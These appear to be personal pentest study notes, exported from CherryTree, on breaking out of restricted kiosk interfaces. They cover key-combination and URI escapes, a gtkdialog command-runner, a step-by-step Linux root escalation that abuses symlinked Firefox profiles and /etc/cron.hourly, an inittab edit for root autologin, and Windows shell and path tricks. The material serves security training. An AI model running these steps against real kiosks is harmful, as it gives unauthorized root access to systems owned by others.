<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>11- kiosk breakouts</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>11- kiosk breakouts</h1><br/><p>xtigervncviewer</p><p><h2>Intro</h2><ul><li>interfaces with limited functionalities </li></ul></p><p><h2>Bypass KIOSK BASICS (vncviewer)</h2><ul><li>f8 : full screen </li><li>• <small>• Mouse</small><ul><li><small>alt+tab </small></li><li><small>right click</small></li><li><small>shift + ctrl </small></li></ul></li><li><small>keyboard</small><ul><li><small>F1 : help page (try to save something)</small></li><li><small>ctrl+s , ctrl+o , ctrl+p</small></li><li><small>help</small></li><li><small>alt + left</small></li></ul></li><li><small>stickey keys</small><ul><li><small>shift 5times </small></li><li><small>click on link and go to control pannel</small></li></ul></li><li><small>open </small></li><li><small>browser keywords</small><ul><li><small>about:config</small></li><li><small>about:preferences</small></li></ul></li><li><small>directory listing </small></li><li><small>discover other schemes</small><ul><li><small>irc://myhost</small></li><li><small>chose a gui terminal app like xterm,gnome-termlinal,konsole (less likely to be presnet)</small></li><li><small>busybox (combines different progs into a single binary)</small></li><li><small>// the app launches &lt;program&gt; irx://Myhost</small></li></ul></li><li><small>URI </small><ul><li><small>irc://myhost</small></li><li><small>file:///etc/passwd</small></li><li><small>smb:///</small></li></ul></li><li><small>look for GUI programs</small><ul><li><small>/bin/busybox </small></li></ul></li><li><small>other ticks</small><ul><li><small>cp cmd.exe to c:\windows\tasks and change and rename cmd.exe to msedge.exe in its folder </small></li></ul></li></ul><small></small></p><p><small></small></p><p><h2>Use case : firefox runing</h2><ul><li>• <small>• irc://myhost -P &quot;newProfile&quot;</small><ul><li><small>firefox is run with parameters </small></li><li><small>=&gt; escape from firefox</small></li></ul></li><li><small>look for files </small><ul><li><small>web developer =&gt; scratchpad </small></li></ul></li><li><small>Other techniques </small></li></ul></p><p></p><p></p><p><h2>EXploit from firefox</h2><ul><li>file:///etc/passwd<ul><li>file:///proc/version</li><li>/home/guest/.ssh</li></ul></li><li>downloads <ul><li>developers tool =&gt; scratchpad (text editor)</li></ul></li><li>gtkdialog build interfaces with an html style markup language </li><li>simple cmd execution</li><li>irc://myhost -f /home/guest/terminal.txt</li></ul></p><p></p><p>emulate terminal</p><p></p><p><div class="codebox"><pre><span style="color:#7f0044;font-weight:400">&lt;window&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;vbox&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;vbox</span> <span style="color:#333333;font-weight:400">scrollable=</span><span style="color:#3ad900;font-weight:400">&quot;true&quot;</span> <span style="color:#333333;font-weight:400">width=</span><span style="color:#3ad900;font-weight:400">&quot;500&quot;</span> <span style="color:#333333;font-weight:400">height=</span><span style="color:#3ad900;font-weight:400">&quot;400&quot;</span><span style="color:#7f0044;font-weight:400">&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;edit&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;variable&gt;</span>CMDOUTPUT<span style="color:#7f0044;font-weight:400">&lt;/variable&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;input</span> <span style="color:#333333;font-weight:400">file</span><span style="color:#7f0044;font-weight:400">&gt;</span>/tmp/termout.txt<span style="color:#7f0044;font-weight:400">&lt;/input&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;/edit&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;/vbox&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;hbox&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;text&gt;&lt;label&gt;</span>Command:<span style="color:#7f0044;font-weight:400">&lt;/label&gt;&lt;/text&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;entry&gt;&lt;variable&gt;</span>CMDTORUN<span style="color:#7f0044;font-weight:400">&lt;/variable&gt;&lt;/entry&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;button&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;label&gt;</span>Run!<span style="color:#7f0044;font-weight:400">&lt;/label&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;action&gt;</span>$CMDTORUN &gt; /tmp/termout.txt<span style="color:#7f0044;font-weight:400">&lt;/action&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;action&gt;</span>refresh:CMDOUTPUT<span style="color:#7f0044;font-weight:400">&lt;/action&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;/button&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;/hbox&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;/vbox&gt;</span><br /><span style="color:#7f0044;font-weight:400">&lt;/window&gt;</span></pre></div></p><p></p><p></p><p></p><p><h2>Root privesc</h2></p><p></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">ps</span> aux <br /><span style="color:#0088ff;font-weight:400">## locate root processes that could give us root (e.g openbox : e X window manager used by the kiosk’s custom interface</span><br /><span style="color:#ff9d00;font-weight:700">find</span> / -perm -u=s -exec ls -al {} +<br /><br />openbox --replace<br /><span style="color:#0088ff;font-weight:400">## terminal is stopped and restarts and bookmarks.htlm is written by root process </span><br /><br /><span style="color:#0088ff;font-weight:400">## backup profile folder</span><br /><span style="color:#ff9d00;font-weight:700">mv</span> /home/guest/.mozilla/firefox/c3pp43bg.default /home/guest/.mozilla/firefox/old_prof<br /><span style="color:#0088ff;font-weight:400">## create a symlink to /usr/bin</span><br /><span style="color:#ff9d00;font-weight:700">ln</span> -s /usr/bin /home/guest/.mozilla/firefox/c3pp43bg.default<br /><span style="color:#0088ff;font-weight:400">## This is a huge breakthrough. We can write files to privileged directories!; yet wen&#39;t rename the file because of folder permissions </span><br />openbox --replace<br /><span style="color:#0088ff;font-weight:400"># write a testscript.sh using scratchpad</span><br /><span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&quot;#!/bin/bash&quot;</span> <span style="color:#ff9d00;font-weight:700">&gt;</span> /usr/bin/bookmarks.html<br /><span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&quot;gtkdialog -f /home/guest/terminal.txt&quot;</span> <span style="color:#ff9d00;font-weight:700">&gt;&gt;</span> /usr/bin/bookmarks.html<br /><span style="color:#0088ff;font-weight:400">## run the script</span><br /><span style="color:#0088ff;font-weight:400">###With the script in place, we need to get the system to run it as a privileged user. Normally, we</span><br /><span style="color:#0088ff;font-weight:400">###could leverage several privilege escalation techniques.</span><br /><span style="color:#0088ff;font-weight:400">### example /etc/profile.d (difficult because need sh); /etc/cron.hourly</span><br /><span style="color:#ff9d00;font-weight:700">rm</span> /home/guest/.mozilla/firefox/c3pp43bg.default<br /><span style="color:#ff9d00;font-weight:700">ln</span> -s /etc/cron.hourly /home/guest/.mozilla/firefox/c3pp43bg.default<br />openbox --replace<br /><span style="color:#ff9d00;font-weight:700">chmod</span> +x /etc/cron.hourly/bookmarks.html<br /><span style="color:#ff9d00;font-weight:700">ls</span> -la /bin/busybox<br /><span style="color:#ff9d00;font-weight:700">cp</span> /bin/busybox /home/guest/busybox<br /><span style="color:#0088ff;font-weight:400">## wait the exploit on the top of the hour </span><br /><span style="color:#ff9d00;font-weight:700">ls</span> -la /home/guest</pre></div></p><p><img src="images/21-1.png" alt="images/21-1.png" /></p><p><img src="images/21-2.png" alt="images/21-2.png" /></p><p></p><p><h2>Post exploit</h2></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># create a runterminal.sh</span><br /><br /><span style="color:#0088ff;font-weight:400">#!/bin/bash</span><br /><span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>gtkdialog -f <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>guest<span style="color:#ff9d00;font-weight:700">/</span>terminal.txt<br /><br /><span style="color:#0088ff;font-weight:400">## get root pseudo terminal</span><br /><br /><span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>guest<span style="color:#ff9d00;font-weight:700">/</span>busybox <span style="color:#ff9d00;font-weight:700">sh</span> /home/guest/runterminal.sh<br /><br /><span style="color:#0088ff;font-weight:400">## we can try sending keys to programmaticlay open terminals </span><br />xdotool key Ctrl+Alt+F3<br /><br /><span style="color:#0088ff;font-weight:400">## enable vtswitching </span><br /><span style="color:#ff9d00;font-weight:700">cat</span> /etc/X11/xorg.conf.d/10-xorg.conf<br /><span style="color:#ff9d00;font-weight:700">cp</span> /home/guest/xorg.txt /etc/X11/xorg.conf.d/10-xorg.conf<br /><span style="color:#ff9d00;font-weight:700">chmod</span> 644 /etc/X11/xorg.conf.d/10-xorg.conf<br />openbox --replace <br /><br /><span style="color:#0088ff;font-weight:400">## copy tty config </span><br /><span style="color:#ff9d00;font-weight:700">cp</span> /etc/inittab /home/guest/inittab.txt<br /><span style="color:#ff9d00;font-weight:700">chmod</span> 777 /home/guest/inittab.txt<br /><span style="color:#0088ff;font-weight:400">## add this line in the console tty config </span><br />c3::respawn:<span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">/</span>agetty --noclear --autologin root 38400 tty3 linux<br /><br /><span style="color:#0088ff;font-weight:400">## copy the file back </span><br /><span style="color:#ff9d00;font-weight:700">cp</span> /home/guest/inittab.txt /etc/inittab<br /><span style="color:#ff9d00;font-weight:700">chmod</span> 600 /etc/inittab<br /><span style="color:#0088ff;font-weight:400">## reload the settings</span><br /><br /><span style="color:#0088ff;font-weight:400">## create restartvnc.sh // kill vnc and start terminal</span><br /><span style="color:#0088ff;font-weight:400">#!/bin/bash</span><br /><span style="color:#ff9d00;font-weight:700">killall</span> x11vnc<br />x11vnc -rawfb vt3<br /><span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">/</span>init q<br /><br /><span style="color:#0088ff;font-weight:400">## reconnect and we&#39;rebpresented with tr</span></pre></div></p><p><img src="images/21-3.png" alt="images/21-3.png" /></p><p></p><p></p><p><h2>windows kiosks tricks</h2></p><p>•If a browser-based kiosk accepts text input, we could substitute environment variables for full file paths (bypass file based access restrictions)<ul><li>%APPDATA%</li></ul></li><li></p><p><table class="table"><tr><th>env </th><th>Variable</th></tr><tr><td>%ALLUSERSPROFILE%</td><td>C:\Documents and Settings\All Users</td></tr><tr><td>%APPDATA%</td><td>C:\Documents and Settings\Username\Application Data</td></tr><tr><td>%COMMONPROGRAMFILES%</td><td>C:\Program Files\Common Files</td></tr><tr><td>%COMMONPROGRAMFILES(x86)%</td><td>C:\Program Files (x86)\Common Files</td></tr><tr><td>%COMSPEC%</td><td>C:\Windows\System32\cmd.exe</td></tr><tr><td>%HOMEDRIVE%</p><p>%SystemDrive%</td><td>c:\</td></tr><tr><td>%HOMEPATH%</td><td>C:\Documents and Settings\Username</td></tr><tr><td>%PROGRAMFILES%</td><td>C:\Program Files</td></tr><tr><td>%WINDIR%</p><p>%SystemRoot%</td><td>C:\Windows</td></tr><tr><td>%TEMP% and %TMP%</td><td>C:\Documents and Settings\Username\Local</p><p>Settings\Temp</td></tr></table></p><p><ul><li>replace c:\ with \\127.0.0.1\C$\</li><li>shortcuts in file browsers<ul><li></li></ul></li></ul><table class="table"><tr><th>command</th><th>action</th></tr><tr><td>shell:System</td><td>Opens the system folder</td></tr><tr><td>shell:Common</td><td>menu option</td></tr><tr><td>shell:Downloads</td><td>user downloads</td></tr><tr><td>shell:MyComputerFolder</td><td>Opens the “This PC” window, showing devices and drives for the</p><p>shell:MyComputerFolder</p><p>system</td></tr></table></p><p><ul><li>if we can get access to a help dialog, we may be able to search for specific utilities such as Notepad, cmd.exe, or PowerShell.</li><li>If we are able to browse the filesystem, such as through a file open or save dialog, but right-</li></ul></p><p>clicking is disabled, it may be possible to start an application by dragging and dropping files onto</p><p>it. Good candidates for this are cmd.exe and powershell.exe, if they are available on the kiosk, as</p><p>they can provide a system shell. If the filetype being dragged is associated with the program, the</p><p>program will likely open it.</p><p><img src="images/21-4.png" alt="images/21-4.png" /></p><p><ul><li>print dialog </li><li>shortcuts : ctrl+alt+del (lock screen) ctrl+alt+esc (task maanager)</li></ul></p></div>
</body>
</html>
